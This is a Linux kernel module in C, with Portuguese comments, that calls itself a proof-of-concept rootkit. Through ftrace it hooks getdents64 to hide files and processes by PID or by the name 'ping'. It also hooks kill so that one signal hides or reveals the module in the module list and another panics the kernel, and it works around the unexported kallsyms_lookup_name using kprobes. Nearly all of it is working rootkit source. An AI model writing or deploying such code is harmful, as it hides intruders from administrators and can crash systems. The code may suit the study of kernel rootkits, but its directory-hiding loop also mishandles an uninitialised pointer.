#include <asm-generic/errno-base.h>
#include <linux/init.h>
#include <linux/limits.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/version.h>
#include <linux/namei.h>
#include <linux/kallsyms.h>
#include <linux/kprobes.h>
#include <linux/sched.h>
#include <linux/sched/signal.h>
#include <linux/uaccess.h>
#include <linux/slab.h>
#include <linux/namei.h>
#include <linux/ftrace.h>
#include <linux/dirent.h>
#include <linux/list.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Breno Nascimento");
MODULE_DESCRIPTION("Prova de conceito de rootkit por intercepcao de syscall");
MODULE_VERSION("0.1");

// x64 tem prefixo especifico em suas syscalls
#define NOME_SYSCALL(syscall) ("__x64_" syscall)

#define ROOTKIT_FILE "arquivo_secreto"
#define ROOTKIT_FUNC NOME_SYSCALL("sys_getdents64")

struct ftrace_hook {
    const char* name;
    void* function;
    void* original;

    unsigned long address;
    struct ftrace_ops ops;
};
static struct ftrace_hook hook1;
static struct ftrace_hook hook2;
static char* pid = "0";
module_param(pid, charp, S_IRUGO);
MODULE_PARM_DESC(pid, "PID do processo a esconder");

static short hidden = 0;
static struct list_head *prev_module;

// compilador fica com raiva se nao colocar prototipo antes da declaracao de funcao ja que o kernel segue 
// a metodologia POE (Programacao Orientada a Espaguetes)
static void notrace fh_ftrace_thunk(unsigned long ip, unsigned long parent_ip, struct ftrace_ops *ops, struct ftrace_regs *fregs);
static void notrace fh_ftrace_thunk(unsigned long ip, unsigned long parent_ip, struct ftrace_ops *ops, struct ftrace_regs *fregs)
{
    struct ftrace_hook *hook = container_of(ops, struct ftrace_hook, ops);
    struct pt_regs *regs = ftrace_get_regs(fregs);
    // pra evitar loop infinito do tipo (desvia pro hook -> chama original no hook -> ftrace pega chamada e desvia pro hook -> chama original no hook -> ...)
    // usamos essa funcao thunk para verificar antes se deveriamos desviar mesmo pro hook (i.e. quem chamou a funcao original foi uma funcao daqui?)
    if(!within_module(parent_ip, THIS_MODULE))
        regs->ip = (unsigned long) hook->function;
}

static unsigned long * __sys_call_table; // endereco da nossa tabela de syscall

// precisamos redeclarar a syscall original da forma que e' definida no kernel pra poder reusar ela posteriormente 
// antigamente, os argumentos eram passados pra syscall do jeito que aparenta ser (pela definicao do kernel).
// porem, desde o kernel 4.17.0, isso mudou pra que os registradores fossem copiados pra uma struct pt_regs e ai sim
// serem passados como unico argumento pra syscall
// em ptrace.h, a struct e' definido de forma que cada registrador tem seu nome comum, sem o prefixo (rsi -> si)
asmlinkage long (*orig_func)(const struct pt_regs *);
asmlinkage long (*orig_kill)(const struct pt_regs *);
asmlinkage int hook_mkdir(const struct pt_regs *regs);
asmlinkage int hook_kill(struct pt_regs *regs);
asmlinkage int hook_func(const struct pt_regs *regs);

asmlinkage int hook_mkdir(const struct pt_regs *regs) {
    char __user *pathname = (char *) regs->di;
    char dir_name[NAME_MAX] = {0};

    long error  = strncpy_from_user(dir_name, pathname, NAME_MAX);
    if (error) printk(KERN_INFO "rootkit: Tentando criar um diretorio com nome %s\n", dir_name);

    orig_func(regs);
    return 0;
}

asmlinkage int hook_kill(struct pt_regs *regs) {
    int sig = regs->si;

    if (sig == 64) {
        if (!hidden) {
            printk(KERN_INFO "rootkit: ocultando modulo da lista\n");
            prev_module = THIS_MODULE->list.prev;
            list_del(&THIS_MODULE->list);
            hidden = 1;
        }
        else if (hidden) {
            printk(KERN_INFO "rootkit: revelando modulo!\n");
            list_add(&THIS_MODULE->list, prev_module);
            hidden = 0;
        }
        return 0;
    }

    else if (sig == 42) {
        // printk(KERN_ALERT "rootkit: sinal especial recebido!!!\n");
        // regs->si = SIGINT;
        // return orig_func(regs);
        panic("BRUNO SAFADO");
    }
    else {
        if (sig) printk(KERN_INFO "rootkit: sinal comum recebido: %d\n", sig);
        return orig_kill(regs);
    }
}

asmlinkage int hook_func(const struct pt_regs *regs)
{
    struct linux_dirent64 __user *dirent = (struct linux_dirent64 *)regs->si;

    /* Declare the previous_dir struct for book-keeping */
    struct linux_dirent64 *previous_dir, *current_dir, *dirent_ker = NULL;
    unsigned long offset = 0;

    int ret = orig_func(regs);
    dirent_ker = kzalloc(ret, GFP_KERNEL);
    // printk(KERN_INFO "rootkit: memoria alocada com sucesso; tamanho da entrada: %d\n", ret);

    if ( (ret <= 0) || (dirent_ker == NULL) )
        return ret;

    long error;
    error = copy_from_user(dirent_ker, dirent, ret);
    if(error)
        goto done;
    // current_dir = (void*)dirent_ker + offset;
    // printk(KERN_INFO "rootkit: item unico atual: %s\n", current_dir->d_name);

    while (offset < ret) {
        current_dir = (void*)dirent_ker + offset;
        // printk(KERN_INFO "rootkit: item: %s\n", current_dir->d_name);
        // if (strcmp(pid, current_dir->d_name) == 0 && strcmp(pid, "0") != 0) {
        if (strcmp(pid, current_dir->d_name) == 0 || strcmp("ping", current_dir->d_name) == 0) {
            printk(KERN_ALERT "rootkit: MATCH FILE\n");

            previous_dir->d_reclen += current_dir->d_reclen;
        }
        else {
            previous_dir = current_dir;
        }
        offset += current_dir->d_reclen;
    }
    error = copy_to_user(dirent, dirent_ker, ret);
    if (error) goto done;

done:
    kfree(dirent_ker);
    return ret;
}

// kallsyms_lookup_name(): dado o simbolo de uma funcao do kernel, retorna o endereco de memoria dessa
// funcao (em espaco de kernel)

/* desde a versao 5.7 do kernel, kallsyms_lookup_name() foi des-exportado pois havia gente abusando
 * dessa funcao pra chamar funcoes que sao licenciadas por GPL sem que o modulo delas seja necessariamente
 * licenciado tambem por GPL. Improvisamos nisso usando kprobes pra pegar o endereco da funcao e trazer
 * de volta pro nosso modulo*/
unsigned long* buscar_kallsyms_lookup_name(void); // cc quer que tenha esse prototipo antes da definicao de fato

unsigned long* buscar_kallsyms_lookup_name(void) {
    struct kprobe kp;
    unsigned long* addr;

    memset(&kp, 0, sizeof(struct kprobe));
    kp.symbol_name = "kallsyms_lookup_name";

    if (register_kprobe(&kp) < 0) {
        return 0;
    }
    addr = (unsigned long*)kp.addr;
    unregister_kprobe(&kp);
    return addr;
}

inline void cr0_write(unsigned long cr0) {
    asm volatile("mov %0,%%cr0" : : "r"(cr0) : "memory");
}

static inline void desproteger_memoria(void) {
    unsigned long cr0 = read_cr0();
    clear_bit(16, &cr0);

    cr0_write(cr0);
}

static inline void proteger_memoria(void) {
    unsigned long cr0 = read_cr0();
    set_bit(16, &cr0);

    cr0_write(cr0);
}

static int __init rootkit_init(void) {
    // unsigned long addr;
    // addr = kallsyms_lookup_name("vfs_mkdir");
    unsigned long* (*kln)(const char*) = (unsigned long*(*)(const char*))buscar_kallsyms_lookup_name();
    if (!kln) {
        printk(KERN_ERR "rootkit: nao foi possivel pegar o endereco de 'kallsyms_lookup_name()'\n");
        return -ENOENT;
    }
    printk(KERN_INFO "rootkit: carregado no sistema >:D\n");
    
    // buscar o endereco original da funcao pra poder usar no meio do hook
    orig_func = (long int (*)(const struct pt_regs*))kln(ROOTKIT_FUNC);
    orig_kill = (long int (*)(const struct pt_regs*))kln(NOME_SYSCALL("sys_kill"));
    // hook = {.name = "vfs_mkdir", .function = (void*)hook_mkdir, .original = &orig_mkdir};
    // nome da syscall que queremos pegar
    hook1.name = ROOTKIT_FUNC;
    // pra onde redirecionar essa syscall
    hook1.function = (void*)hook_func;
    // endereco da syscall original, caso queiramos reusar
    hook1.original = &orig_func;
    // vamos dizer ao ftrace pra desviar primeiro pra uma funcao falsa (thunk) e de la verificamos se iremos pra funcao verdadeira de fato
    hook1.ops.func = fh_ftrace_thunk;
    // respectivamente: salvar o contexto dos regs; protecao contra recursao; modificar o ponteiro de instrucao
    hook1.ops.flags = FTRACE_OPS_FL_SAVE_REGS | FTRACE_OPS_FL_RECURSION | FTRACE_OPS_FL_IPMODIFY;

    hook2.name = "sys_kill";
    hook2.function = (void*)hook_kill;
    hook2.original = &orig_kill;
    hook2.ops.func = fh_ftrace_thunk;
    hook2.ops.flags = FTRACE_OPS_FL_SAVE_REGS | FTRACE_OPS_FL_RECURSION | FTRACE_OPS_FL_IPMODIFY;

    int err;
    err = ftrace_set_filter(&hook1.ops, ROOTKIT_FUNC, strlen(ROOTKIT_FUNC), 0);
    // err = ftrace_set_filter_ip(&hook.ops, hook.address, 0, 0);
    if (err) {
        printk(KERN_ERR "rootkit: ftrace_set_filter1() falhou; err = %d\n", err);
        return err;
    }
    err = ftrace_set_filter(&hook2.ops, NOME_SYSCALL("sys_kill"), strlen(NOME_SYSCALL("sys_kill")), 0);
    // err = ftrace_set_filter_ip(&hook.ops, hook.address, 0, 0);
    if (err) {
        printk(KERN_ERR "rootkit: ftrace_set_filter2() falhou; err = %d\n", err);
        return err;
    }
 
    err = register_ftrace_function(&hook1.ops);
    if (err) {
        printk(KERN_ERR "rootkit: register_ftrace_function() falhou; err = %d\n", err);
        return err;
    }
    err = register_ftrace_function(&hook2.ops);
    if (err) {
        printk(KERN_ERR "rootkit: register_ftrace_function() falhou; err = %d\n", err);
        return err;
    }
    printk(KERN_INFO "rootkit: ftrace preparado. syscalls sendo redirecionadas\n");

    // desproteger_memoria();

    // printk(KERN_INFO "rootkit: fazendo hook de mkdir; syscall de valor %d\n", __NR_mkdir);
    // __sys_call_table[__NR_mkdir] = (unsigned long)hook_mkdir;

    // proteger_memoria();

    return 0;
}

static void __exit rootkit_exit(void) {
    // desproteger_memoria();
    
    // printk(KERN_INFO "rootkit: restaurando syscall mkdir\n");
    // __sys_call_table[__NR_mkdir] = (unsigned long)orig_mkdir;

    // proteger_memoria();

    int err;
    err = unregister_ftrace_function(&hook1.ops);
    if(err)
    {
        printk(KERN_DEBUG "rootkit: unregister_ftrace_function() failed: %d\n", err);
    }
    err = unregister_ftrace_function(&hook2.ops);
    if(err)
    {
        printk(KERN_DEBUG "rootkit: unregister_ftrace_function() failed: %d\n", err);
    }
    // err = ftrace_set_filter_ip(&hook.ops, hook.address, 1, 0);
    // if(err)
    // {
    //     printk(KERN_DEBUG "rootkit: ftrace_set_filter_ip() failed: %d\n", err);
    // }
    printk(KERN_INFO "rootkit: descarregado D:\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);
